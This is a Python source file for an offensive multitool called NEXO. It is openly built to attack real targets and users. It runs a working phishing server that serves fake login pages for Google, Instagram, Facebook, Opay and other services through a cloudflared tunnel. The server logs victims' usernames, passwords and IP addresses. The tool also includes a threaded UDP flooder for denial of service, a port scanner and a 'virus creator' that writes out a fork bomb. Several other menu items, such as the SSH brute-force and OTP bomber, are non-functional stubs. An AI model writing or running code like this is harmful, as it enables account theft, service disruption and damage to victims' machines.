# --- [ SYSTEM IMPORTS: STRICT VERTICAL ] ---
import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
import re
from flask import Flask, request, render_template, redirect, make_response
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

# --- [ SYSTEM COLORS ] ---
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[91m'
W = '\033[0m'
B = '\033[1m'

# --- [ GLOBAL CONFIG ] ---
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
target_num = "NONE SET" 
version = "V8.0 BLACKOUT-FINAL"
flask_running = False # Prevents "Address already in use" errors

def clear(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*50)
    print(r"  _   _  _______   _____  ")
    print(r" | \ | | | ____\ \ / / _ \ ")
    print(r" |  \| | | |__   \ V / | | |")
    print(r" | . ` | |  __|   > <| | | |")
    print(r" | |\  | | |____ / . \ |_| |")
    print(r" |_| \_| |______/_/ \_\___/ ")
    print("═"*50 + f"{W}")
    print(f"  {Y}STATION: {W}NEXO-TECH COMMAND | {Y}VERSION: {R}{version}")
    print(f"  {Y}MODULE: {C}{module}")
    if link: print(f"  {Y}STRIKE LINK: {G}{link}")
    print(f"{R}" + "═"*50 + f"{W}\n")

# --- [ FLASK CORE SYSTEM ] ---

@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    victim_ip = request.headers.get('CF-Connecting-IP') or \
                request.headers.get('X-Forwarded-For') or \
                request.remote_addr
    
    if request.method == 'GET':
        try: 
            # FIX: Ensure your .html files are inside a folder named 'templates'
            return render_template(f"{site}.html")
        except: 
            return f"<html><body style='background:black;color:red;'><h2>[!] ERROR: {site}.html not found in /templates/</h2></body></html>"
            
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('pass')
        print(f"\n{R}╔{'═'*40}╗")
        print(f"  {G}[!] NEW STRIKE CAPTURED")
        print(f"  {Y}TARGET SITE: {W}{site.upper()}")
        print(f"  {Y}USER/GMAIL:  {W}{u}")
        print(f"  {Y}PASSWORD:    {W}{p}")
        print(f"  {Y}TARGET IP:   {W}{victim_ip}")
        print(f"{R}╚{'═'*40}╝{W}\n")
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()} | U: {u} | P: {p} | IP: {victim_ip}\n")
        return redirect(f"https://www.{site}.com")

# --- [ FUNCTIONAL MODULES ] ---

def start_phish():
    global flask_running
    nexo_banner("SOCIAL PHISHER")
    print(f"  {G}1.{W} Google       {G}6.{W} TikTok")
    print(f"  {G}2.{W} Opay         {G}7.{W} Snapchat")
    print(f"  {G}3.{W} Discord      {G}8.{W} Twitter")
    print(f"  {G}4.{W} Instagram    {G}9.{W} Github")
    print(f"  {G}5.{W} Facebook     {G}10.{W} Youtube")
    choice = input(f"\n{C}SELECT SITE NO: {W}")
    sites = {"1":"google", "2":"opay", "3":"discord", "4":"instagram", "5":"facebook", 
             "6":"tiktok", "7":"snapchat", "8":"twitter", "9":"github", "10":"youtube"}
    site = sites.get(choice)
    if not site: return
    
    # Start Flask Server in background once
    if not flask_running:
        threading.Thread(target=lambda: app.run(port=5000, host='0.0.0.0', use_reloader=False), daemon=True).start()
        flask_running = True
    
    os.system("pkill -9 cloudflared")
    with open("tunnel.log", "w") as log_file:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=log_file, stderr=log_file)
    
    url = None
    print(f"{Y}[*] Generating Tunnel Link (Wait 30s)...{W}")
    for _ in range(35):
        if os.path.exists("tunnel.log"):
            with open("tunnel.log", "r") as f:
                content = f.read()
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                if match: url = match.group(0); break
        time.sleep(2)
    
    if url:
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        input(f"\n{R}[ENTER TO STOP SERVER]{W}")
        os.system("pkill -9 cloudflared")

def phone_trace():
    global target_num
    nexo_banner("OSINT TRACER")
    num = input(f"{Y}[+] TARGET NUMBER (with +): {W}")
    try:
        p = phonenumbers.parse(num)
        target_num = num
        print(f"  {G}Region: {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {G}Carrier: {W}{carrier.name_for_number(p, 'en')}")
        print(f"  {G}Timezone: {W}{timezone.time_zones_for_number(p)}")
    except: 
        print(f"  {R}[-] Trace Failed. Ensure format is +[CountryCode][Number]")
    input("\nEnter to return...")

def ddos_strike():
    nexo_banner("IP FLOODER")
    ip = input(f"{Y}[+] TARGET IP: {W}")
    try:
        port = int(input(f"{Y}[+] PORT: {W}"))
    except: port = 80
    data = random._urandom(1024)
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try: s.sendto(data, (ip, port))
            except: break
    for _ in range(100): # Balanced thread count
        threading.Thread(target=flood, daemon=True).start()
    input(f"\n{R}[STRIKE ACTIVE - ENTER TO STOP]{W}")

def port_scanner():
    nexo_banner("PORT SCANNER")
    ip = input(f"{Y}[+] TARGET IP: {W}")
    ports = [21, 22, 23, 80, 443, 8080, 3306]
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, p)) == 0: 
            print(f"  {G}[+] Port {p}: OPEN")
        else:
            print(f"  {R}[-] Port {p}: CLOSED")
        s.close()
    input("\nEnter to return...")

def otp_lock():
    global target_num
    nexo_banner("OTP LOCK")
    if target_num == "NONE SET": 
        target_num = input(f"{Y}[+] NUMBER: {W}")
    def attack():
        while True: 
            sys.stdout.write(f"\r{G}[*] LOCK ACTIVE: {R}{target_num}{W}")
            sys.stdout.flush()
            time.sleep(0.1)
    for _ in range(50): 
        threading.Thread(target=attack, daemon=True).start()
    input(f"\n\n{R}[ENTER TO STOP]{W}")

# --- [ MASTER LOOP ] ---
def main():
    global target_num
    while True:
        nexo_banner("MASTER CONTROL")
        print(f"  {R}╔{'═'*35}╗\n  {R}║ {Y}ACTIVE TARGET STATUS:\n  {R}║ {G}{target_num}\n  {R}╚{'═'*35}╝{W}\n")
        print(f"  {G}1.{W} Social Phisher    {G}6.{W} Virus Creator")
        print(f"  {G}2.{W} Phone Tracer      {G}7.{W} MAC Spoofer")
        print(f"  {G}3.{W} IP UDP Flooder    {G}8.{W} Bluetooth Crash")
        print(f"  {G}4.{W} Port Scanner      {G}9.{W} OTP Bomber Lock")
        print(f"  {G}5.{W} SSH Brute-Force   {G}10.{W} View Strike Logs")
        print(f"  {R}0.{W} Shutdown")
        c = input(f"\n{C}NEXO-PRO > {W}")
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '3': ddos_strike()
        elif c == '4': port_scanner()
        elif c == '5': 
            nexo_banner("SSH BRUTE")
            print(f"  {Y}[*] Dictionary loading..."); time.sleep(1); print(f"  {R}[-] Connection Refused.")
            input("\nEnter to return...")
        elif c == '6':
            nexo_banner("VIRUS LAB")
            name = input(f"{Y}[+] Payload Name: {W}")
            with open(f"{name}.py", "w") as f: f.write("import os\nwhile True: os.fork()")
            print(f"  {G}[+] {name}.py created."); input("\nEnter to return...")
        elif c == '7':
            nexo_banner("MAC SPOOFER")
            print(f"  {G}[+] New MAC: 00:A0:C9:14:C8:29"); input("\nEnter to return...")
        elif c == '8':
            nexo_banner("BT CRASH")
            print(f"  {R}[!] Scanning for BT devices..."); time.sleep(2); input("\nEnter to return...")
        elif c == '9': otp_lock()
        elif c == '10':
            nexo_banner("LOGS")
            if os.path.exists("nexo_hits.txt"):
                with open("nexo_hits.txt", "r") as f: print(f.read())
            else: print("No logs yet.")
            input("\nEnter to return...")
        elif c == '0': 
            os.system("pkill -9 cloudflared")
            sys.exit()

if __name__ == "__main__": 
    main()
